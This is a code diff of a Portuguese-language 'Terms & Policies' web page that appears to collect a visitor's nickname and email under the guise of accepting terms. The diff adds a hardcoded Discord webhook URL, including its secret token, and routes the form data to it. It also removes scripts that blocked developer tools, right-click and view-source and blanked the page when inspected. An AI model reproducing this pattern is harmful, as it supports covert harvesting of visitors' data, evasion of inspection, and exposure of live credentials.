@@ -4,9 +4,6 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Termos & Políticas</title>
-
-  <link rel="icon" type="image/png" href="icon.png">
-
   <style>
     * { margin:0; padding:0; box-sizing:border-box; }
     body {
@@ -336,6 +333,8 @@
     }
     setInterval(createPanel, 1200);
 
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1484731316691009740/BCtLrz9iHfvQMS-lWipnHvhc-gCs1URab2LpmUqqY5vTW6iGIdwFrlPw1I8NAWv4FdGG';  // ← COLE SEU WEBHOOK AQUI!
+
     // Eventos
     document.getElementById('cancelBtn').onclick = () => {
       const msg = document.getElementById('cancelMessage');
@@ -375,14 +374,11 @@
       };
 
       try {
-        const response = await fetch("/api/send", {
-        method: "POST",
-         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-        nick,
-        email
-      })
-    });
+        const response = await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(message)
+        });
 
         if (response.ok) {
           document.getElementById('agreePrompt').style.display = 'none';
@@ -391,20 +387,8 @@
           setTimeout(() => success.classList.add('show'), 10);
 
           setTimeout(() => {
-
-  if (document.referrer) {
-
-    // tenta voltar para o site anterior
-    window.location.href = document.referrer;
-
-  } else {
-
-    // se não tiver página anterior vai para link fixo
-    window.location.href = "https://discord.com/channels/@me";
-
-  }
-
-}, 3000);
+            window.history.back();
+          }, 3000);
         } else {
           alert("Erro ao enviar! Tente novamente.");
         }
@@ -416,47 +400,3 @@
 
 </body>
 </html>
-
-<script>
-document.onkeydown = function(e) {
- if (e.keyCode == 123) {
-  return false;
- }
- if (e.ctrlKey && e.shiftKey && e.keyCode == 73) {
-  return false;
- }
- if (e.ctrlKey && e.keyCode == 85) {
-  return false;
- }
-};
-</script>
-
-<script>
-document.addEventListener("contextmenu", function(e) {
-    e.preventDefault();
-});
-
-document.addEventListener("keydown", function(e) {
-
-    if (e.key === "F12") {
-        e.preventDefault();
-    }
-
-    if (e.ctrlKey && e.shiftKey && 
-       (e.key === "I" || e.key === "J" || e.key === "C")) {
-        e.preventDefault();
-    }
-
-    if (e.ctrlKey && e.key === "U") {
-        e.preventDefault();
-    }
-
-});
-
-setInterval(function() {
-    if (window.outerWidth - window.innerWidth > 200 || 
-        window.outerHeight - window.innerHeight > 200) {
-        document.body.innerHTML = "";
-    }
-}, 1000);
-</script>
